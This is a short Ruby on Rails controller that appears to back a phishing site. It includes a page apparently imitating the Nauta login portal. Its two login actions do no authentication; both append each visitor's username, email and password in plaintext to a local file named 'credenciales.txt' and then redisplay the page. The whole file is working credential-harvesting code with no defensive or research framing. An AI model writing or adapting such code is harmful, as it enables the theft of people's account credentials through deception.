class SessionsController < ApplicationController
    def index
        render "index"
    end

    def page_basic
        render "basic"
    end

    def nauta
        respond_to do |format|
            format.html { render "nauta" }
            format.any do
                Rails.logger.info("Unsupported request format: #{request.headers['Accept']}")
                render "public/406-unsupported-browser", status: :not_acceptable
            end
            format.turbo_stream
        end
    end

    def basic_login
        save_credentials(params[:username], params[:email], params[:password])
        render "basic"
    end

    def nauta_login
        save_credentials(params[:username], params[:email], params[:password])
        render "nauta"
    end

    private

    def save_credentials(username, email, password)
        File.open('credenciales.txt', 'a') do |file|
            file.puts "Username: #{username}, Email: #{email}, Password: #{password}"
        end
    end
end
